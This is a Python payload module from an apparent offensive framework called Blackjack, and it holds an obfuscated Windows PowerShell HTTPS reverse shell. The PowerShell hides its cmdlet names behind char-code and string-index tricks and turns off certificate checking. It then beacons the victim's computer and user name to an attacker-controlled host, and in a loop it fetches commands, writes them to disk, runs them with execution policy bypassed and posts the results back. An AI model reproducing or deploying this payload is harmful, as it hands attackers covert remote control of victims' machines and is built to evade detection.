# This module is part of the Blackjack framework

class Payload:

    info = {
        'Title' : 'Windows PowerShell outfile BlackJack https',
        'Author' : 'Rojahs Montari (r0jahsm0ntar1)',
        'Description' : 'An Https based beacon-like reverse shell that writes and executes commands from disc',
        'References' : ['https://github.com/r0jahsm0ntar1/africana-framework', 'https://revshells.com']
    }

    meta = {
        'handler' : 'blackjack',
        'type' : 'ps-outfile-cm-ssl',
        'os' : 'windows',
        'shell' : 'powershell.exe'
    }

    config = {
        'frequency' : 15,
        'outfile' : "C:\\Users\\$env:USERNAME\\.local\\africs.ps1"
    }

    parameters = {
        'lhost' : None
    }

    attrs = {
        'obfuscate' : False,
        'encode' : True
    }

    data = '''& ([string]::join('', ( (97,100,100,45,116,121,112,101) |%{$($_)}|%{ ( [char][int] $($_))})) |%{$_}| % {$($_)}) @"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{$($_)}|%{ ( [char][int] $_)})) |%{$_}| % {$_}) TrustAllCertsPolicy
$ConfirmPreference='None';$s=\'*LHOST*\';$i=\'*SESSIONID*\';$p=\'https://\';$v=& ([string]::join('', ( (73,110,118,111,107,101,45,82,101,115,116,77,101,116,104,111,100) |%{$_}|%{ ( [char][int] $_)})) |%{$_}| % {$($_)}) -UseBasicParsing -Uri $p$s/*VERIFY*/$env:COMPUTERNAME/$env:USERNAME -Headers @{"*BLACKJACKID*"=$i};for (;;){$c=(& ([string]::join('', ( (73,110,118,111,107,101,45,82,101,115,116,77,101,116,104,111,100) |%{$_}|%{ ( [char][int] $($_))})) |%{$($_)}| % {$($_)}) -UseBasicParsing -Uri $p$s/*GETCMD* -Headers @{"*BLACKJACKID*"=$i});if (!(@(\'None\',\'quit\') -contains $c)) {& (("r8E6Cilu5fIOB9N7vcW4Mes2xagqLbpVFowhHGYTPS01UmQ3RZkjAzdnD-KytXJ")[18,0,5,60,21,57,11,7,60,30,7,60] -join '') "$c" |%{$_}| & (("uIRh38NSwKP-5FVjitXB4A0bvlUJzfQ2ZqoaDMe9pTEnWdkmgGH7yLcYsr6xO1C")[34,0,17,11,29,16,25,38] -join '') -filepath *OUTFILE*;$r=powershell -ep bypass *OUTFILE* -ErrorAction Stop -ErrorVariable e;$r=& (("vDGWiUKya0d1xsJzoYOQRnLwhqN28Ag3P9Tl5I7tS-b4mBCeucZjHfkrF6VEXMp")[18,48,39,41,40,39,55,4,21,30] -join '') -InputObject $r;$x=& ([string]::join('', ( (73,110,118,111,107,101,45,82,101,115,116,77,101,116,104,111,100) |%{$($_)}|%{ ( [char][int] $_)})) |%{$($_)}| % {$_}) -Uri $p$s/*POSTRES* -Method POST -Headers @{"*BLACKJACKID*"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join \' \')} elseif ($c -eq \'quit\') {& (("Qlqg3HE8DKuN7T-jLz4AGePhJRVxW1fXwmYdZa2CpF6S9sIBycOMtvoikn5r0Ub")[25,21,33,54,53,21,14,46,52,21,33] -join '') *OUTFILE*;& ([string]::join('', ( (83,116,111,112,45,80,114,111,99,101,115,115) |%{$($_)}|%{ ( [char][int] $_)})) |%{$($_)}| % {$($_)}) $PID} sleep *FREQ*}'''
